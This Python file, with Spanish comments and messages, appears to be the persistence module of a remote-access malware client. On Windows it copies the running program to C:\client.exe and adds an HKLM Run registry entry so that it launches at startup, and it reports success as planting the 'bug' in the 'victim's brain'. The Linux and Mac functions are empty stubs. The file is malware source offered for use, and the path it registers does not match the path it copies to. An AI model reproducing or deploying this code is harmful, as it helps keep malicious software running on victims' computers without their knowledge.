
# MODULO DE PERSISTENCIA -> CREADO POR KIRARI

import os
import sys
import shutil
import subprocess 

def windows_persistencia():

	destino = "C:\\client.exe"
	consulta = 'REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /s'
	insertar = 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /t REG_SZ /d "C:\\Users\\Testing\\client.exe"'

	if not os.path.isfile(destino):
		shutil.copyfile(sys.argv[0],destino)

	verficar = subprocess.Popen(consulta,shell=True,stdout=subprocess.PIPE)

	if (b'client.exe' not in verficar.stdout.read()):
		os.system(insertar)
		return (True," Bicho plantado en cerebro victima con exito.")

	else:
		return (True," No se ha podido plantar el bicho, debido a que ya existe uno en el cerebro victima.")


def linux_persistencia():
	return (False," El bicho no se ha podido plantar en este sistema")

def mac_persistencia():
	return (False," El bicho no se ha podido plantar en este sistema")


def activar(plataforma):

	if plataforma=="win":
		proceso,msg = windows_persistencia()
		return proceso,msg

	elif plataforma=="linux":
		proceso,msg = linux_persistencia()
		return proceso,msg

	elif plataforma=="mac":
		proceso,msg = mac_persistencia()
		return proceso,msg

	else:
		return (False," El bicho no se ha podido plantar ")
